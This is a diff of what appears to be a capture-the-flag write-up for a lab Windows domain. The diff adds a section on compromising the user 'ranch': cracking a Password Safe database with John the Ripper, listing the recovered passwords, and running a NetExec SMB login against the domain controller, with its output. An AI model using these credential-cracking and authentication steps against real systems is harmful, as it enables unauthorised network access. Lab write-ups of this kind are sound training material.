@@ -152,6 +152,8 @@ Once again not a lot of interesting info here
 logins.psafe3: Password Safe V3 database
 ```
 
+# Compromising the user `ranch`
+
 The most interesting thing here is the password safe
 
 John the ripper has a 2john tool to generate a hash for this
@@ -194,6 +196,14 @@ root:a%KlRhqbuRgL
 
 These are all the creds extracted from the file
 
+The most interesting logon right now is the domain creds
 
+```python
+❯❯❯ nxc smb dc01.kitsune.local -u 'ranch' -p 'R@nch2026!'            
+SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.176.128    445    DC01             [+] kitsune.local\ranch:R@nch2026! 
+```
+
+Th
 
 
